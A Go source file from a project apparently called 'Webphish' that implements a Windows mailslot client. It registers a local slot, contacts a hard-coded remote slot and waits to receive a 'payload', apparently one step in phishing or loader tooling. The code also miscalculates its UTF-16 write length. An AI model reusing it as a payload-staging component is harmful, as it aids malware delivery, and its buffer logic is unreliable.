package client

import (
	"Webphish/internal"
	"Webphish/internal/console"
	"Webphish/internal/resource"
	"Webphish/internal/w32"
	"bytes"
	"fmt"
	"golang.org/x/sys/windows"
	"time"
	"unsafe"
)

const slotPrefix = "\\\\.\\mailslot"

type MailslotReader struct {
	remoteSlotName string
	localSlotName  string
}

func NewMailslotReader(server string) resource.Client {
	reader := &MailslotReader{
		remoteSlotName: fmt.Sprintf("%s\\%s", slotPrefix, server),
		localSlotName:  fmt.Sprintf("%s\\%s", slotPrefix, internal.RandomString(8)),
	}
	return reader
}

func (r *MailslotReader) runLocalServer(messages chan<- bytes.Buffer, err chan<- internal.ErrorCode) {
	localServerNameBytes, _ := windows.UTF16FromString(r.localSlotName)
	hLocalMailslot, _, _ := w32.Kernel32CreateMailslot.Call(
		uintptr(unsafe.Pointer(&localServerNameBytes[0])),
		uintptr(0), // any size message allowed
		uintptr(5000),
		uintptr(0),
	)

	if int(hLocalMailslot) <= 0 {
		err <- internal.ERR_CREATE_MAILSLOT
		return
	}

	for {
		secondDuration, _ := time.ParseDuration("1s")
		time.Sleep(secondDuration)
		var maxMessageSize uint32
		var nextMessageSize uint32
		var msgCount uint32

		success, _, _ := w32.Kernel32GetMailslotInfo.Call(
			hLocalMailslot,
			uintptr(unsafe.Pointer(&maxMessageSize)),
			uintptr(unsafe.Pointer(&nextMessageSize)),
			uintptr(unsafe.Pointer(&msgCount)),
			uintptr(0),
		)

		if success == 0 || msgCount == 0 {
			continue
		}

		dataRead := make([]byte, nextMessageSize)
		var bytesRead uint32
		w32.Kernel32ReadFile.Call(
			hLocalMailslot,
			uintptr(unsafe.Pointer(&dataRead[0])),
			uintptr(nextMessageSize),
			uintptr(unsafe.Pointer(&bytesRead)),
			uintptr(0),
		)

		if bytesRead > 0 {
			buffer := bytes.NewBuffer(dataRead)
			messages <- *buffer
		} else {
			console.MessageBoxPlain("Error", "Data size is 0")
		}
		return
	}
}

func (r *MailslotReader) connectRemoteServer() internal.ErrorCode {
	//remoteNameBytes, _ := windows.UTF16FromString(r.remoteSlotName)
	strDestinationMx := "\\\\.\\mailslot\\mxIEUser"
	remoteNameBytes, _ := windows.UTF16FromString(strDestinationMx)
	hMx, _, _ := w32.Kernel32CreateFile.Call(
		uintptr(unsafe.Pointer(&remoteNameBytes[0])),
		windows.GENERIC_WRITE,
		windows.FILE_SHARE_READ,
		uintptr(0),
		windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL,
		uintptr(0),
	)

	if int(hMx) <= 0 {
		console.MessageBoxPlain("Error", fmt.Sprintf("Could not connect to remote mailslot: %s", r.remoteSlotName))
		return internal.ERR_CONNECT_MAILSLOT
	}

	var bytesWritten uint32
	mxMsg, _ := windows.UTF16FromString(r.localSlotName)
	success, _, _ := w32.Kernel32WriteFile.Call(
		hMx,
		uintptr(unsafe.Pointer(&mxMsg[0])),
		uintptr(len(mxMsg)*4),
		uintptr(unsafe.Pointer(&bytesWritten)),
		uintptr(0),
	)

	if int(success) == 0 {
		return internal.ERR_WRITE_FAIL
	}

	return internal.GenericSuccess
}

func (r *MailslotReader) Get() ([]byte, internal.ErrorCode) {
	message := make(chan bytes.Buffer, 1)
	err := make(chan internal.ErrorCode, 1)
	var payload bytes.Buffer
	var e internal.ErrorCode

	go r.runLocalServer(message, err)
	e = r.connectRemoteServer()
	if e != internal.GenericSuccess {
		return nil, e
	}
	select {
	case payload = <-message:
		return payload.Bytes(), internal.GenericSuccess
	case e = <-err:
		return nil, e
	}
}
